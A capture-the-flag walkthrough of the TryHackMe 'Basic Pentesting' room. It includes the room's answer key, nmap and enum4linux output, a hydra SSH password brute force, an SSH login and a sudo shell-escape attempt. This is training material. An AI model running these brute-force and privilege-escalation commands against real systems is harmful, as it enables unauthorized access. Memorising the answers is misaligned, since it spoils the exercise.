# Basic Pentesting - This is a machine that allows you to practise web app hacking and privilege escalation 
[![image](https://github.com/GTekSD/SUASS/assets/55411358/558b1177-a89e-415d-b204-ae1b17d9bcac)](https://tryhackme.com/room/basicpentestingjt)

### Task 1 Web App Testing and Privilege Escalation

In these set of tasks you'll learn the following:

- brute forcing
- hash cracking
- service enumeration
- Linux Enumeration

The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file.

Credits to Josiah Pierce from Vulnhub.

#### _Answer the questions below:_

- Deploy the machine and connect to our network
```
No answer needed
```

- Find the services exposed by the machine
```
No answer needed
```

- What is the name of the hidden directory on the web server(enter name without /)?
```
development
```

- User brute-forcing to find the username & password
```
No answer needed
```

- What is the username?
```
jan
```

- What is the password?
```
armando
```

- What service do you use to access the server(answer in abbreviation in all caps)?
```
SSH
```

- Enumerate the machine to find any vectors for privilege escalation
```
No answer needed
```

- What is the name of the other user you found(all lower case)?
```
kay
```

- If you have found another user, what can you do with this information?
```
No answer needed
```

- What is the final password you obtain?
```
heresareallystrongpasswordthatfollowsthepasswordpolicy
```


   -----------------

## Walkthrough!!!

The target is on i need to scan nmap
```
nmap -sC -sV -p- 10.10.132.83
```
```
┌──(gteksd㉿PHENTHESTER)-[~]
└─$ sudo nmap 10.10.132.83
[sudo] password for gteksd: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 16:11 IST
Nmap scan report for 10.10.132.83
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.38 seconds
```
```
┌──(gteksd㉿PHENTHESTER)-[~]
└─$ sudo nmap -sC -sV -p 22,80,139,445,8009,8080 10.10.132.83
[sudo] password for gteksd: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 16:16 IST
Nmap scan report for 10.10.132.83
Host is up (0.21s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  @���U      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2023-10-18T06:53:17-04:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2023-10-18T10:53:17
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h26m23s, deviation: 2h18m34s, median: 6m22s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.16 seconds
```
let me see in firefox

```
view-source:http://10.10.132.83/
```
```
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->


</html>
```
"Check our dev note section.." Hmm..., dev.. developer? development?
```
http://10.10.132.83/development/
```
Boom! development!!!
```
Index of /development
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	dev.txt	2018-04-23 14:52 	483 	 
[TXT]	j.txt	2018-04-23 13:10 	235 	 
Apache/2.4.18 (Ubuntu) Server at 10.10.132.83 Port 80
```
dev.txt?
```

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
j.txt?
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Interesting!

- Apache and SMB
- dev.txt author = Apache Struts = Java Web Application framework = version 2.5.12 (REST)
- /etc/shadow

I need to access to the system! but HOW?

there was SMB, SSH in nmap result!

```
sudo enum4linux 10.10.132.83 
```
```
┌──(gteksd㉿PHENTHESTER)-[~]
└─$ sudo enum4linux 10.10.132.83                             
[sudo] password for gteksd: 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct 18 16:40:05 2023

 =========================================( Target Information )=========================================
                    
Target ........... 10.10.132.83                                                                                                                      
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.132.83 )============================
             
[+] Got domain/workgroup name: WORKGROUP                                                                                                                                
 ================================( Nbtstat Information for 10.10.132.83 )================================
                   
Looking up status of 10.10.132.83                                                                                                                    
        BASIC2          <00> -         B <ACTIVE>  Workstation Service
        BASIC2          <03> -         B <ACTIVE>  Messenger Service
        BASIC2          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.132.83 )===================================
                    
[+] Server 10.10.132.83 allows sessions using username '', password ''                                                                              
 ================================( Getting domain SID for 10.10.132.83 )================================
                    
Domain Name: WORKGROUP                                                                                                                               
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                 
 ===================================( OS information on 10.10.132.83 )===================================
                    
[E] Can't get OS info with smbclient                                                                                                                
[+] Got OS info for 10.10.132.83 from srvinfo:                                                                                                       
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu                                                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 10.10.132.83 )=======================================
                                                                                                                                                     
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                              
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.132.83 )=================================
                  
        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

[+] Attempting to map shares on 10.10.132.83                                                                                                         
                   
//10.10.132.83/Anonymous        Mapping: OK Listing: OK Writing: N/A                                                                                 
[E] Can't understand response:                                                                                                                                           
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                           
//10.10.132.83/IPC$     Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.132.83 )============================
                                                                                                                                 
[+] Attaching to 10.10.132.83 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BASIC2
        [+] Builtin

[+] Password Info for Domain: BASIC2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:                                                                                                 
                    
Password Complexity: Disabled                                                                                                                        
Minimum Password Length: 5


 =======================================( Groups on 10.10.132.83 )=======================================
                                                                                                                                                    
[+] Getting builtin groups:                                                                                                                          
                   
[+]  Getting builtin group memberships:                                                                                                              
                    
[+]  Getting local groups:                                                                                                                           
                    
[+]  Getting local group memberships:                                                                                                                
                    
[+]  Getting domain groups:                                                                                                                          
                    
[+]  Getting domain group memberships:                                                                                                               
                   
 ==================( Users on 10.10.132.83 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                     
[I] Found new SID:                                                                                                                                   
S-1-22-1                                                                                                                                             

[I] Found new SID:                                                                                                                                   
S-1-5-32                                                                                                                                             

[I] Found new SID:                                                                                                                                   
S-1-5-32                                                                                                                                             

[I] Found new SID:                                                                                                                                   
S-1-5-32                                                                                                                                             

[I] Found new SID:                                                                                                                                   
S-1-5-32                                                                                                                                             

[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''      

                                                                                                                                                     
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)                                                                             
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                          
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                    
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                          
                   
S-1-22-1-1000 Unix User\kay (Local User)                                                                                                             
S-1-22-1-1001 Unix User\jan (Local User)

 ===============================( Getting printer info for 10.10.132.83 )===============================
                   
No printers returned.
                                                                                                       
enum4linux complete on Wed Oct 18 16:54:15 2023
```
```
S-1-22-1-1000 Unix User\kay (Local User)                                                                                         
S-1-22-1-1001 Unix User\jan (Local User)
```
Jan and Kay, hmmm.. was mentioned as j and k in those txt files. cool!

haha! BRUTEFORCE TIME!
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.132.83
```
```
┌──(gteksd㉿PHENTHESTER)-[~]
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.132.83
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-18 16:56:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.132.83:22/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 14344063 to do in 2134:32h, 16 active
[22][ssh] host: 10.10.132.83   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-18 17:03:44
```
BOOM!!! armando!

Let's login ssh real quick.
```
ssh jan@10.10.132.83
```
```
┌──(gteksd㉿PHENTHESTER)-[~]
└─$ ssh jan@10.10.132.83
The authenticity of host '10.10.132.83 (10.10.132.83)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.83' (ED25519) to the list of known hosts.
jan@10.10.132.83's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ 
```
HEHE!

```
jan@basic2:~$ pwd
/home/jan
jan@basic2:~$ ../
-bash: ../: Is a directory
jan@basic2:~$ cd ../
jan@basic2:/home$ ls
jan  kay
jan@basic2:/home$ cd kay/
jan@basic2:/home/kay$ ls
pass.bak
jan@basic2:/home/kay$ cat pass.bak 
cat: pass.bak: Permission denied
jan@basic2:/home/kay$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
[sudo] password for jan: 
jan is not in the sudoers file.  This incident will be reported.
```
SHIT!

[linPEAS can save me!](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
```
https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
https://tryhackme.com/room/basicpentestingjt
https://medium.com/@JAlblas/tryhackme-basic-pentesting-walkthrough-9a1821f1d7c6
https://medium.com/@keraattin/basic-pentesting-room-tryhackme-2bb8b8946a92
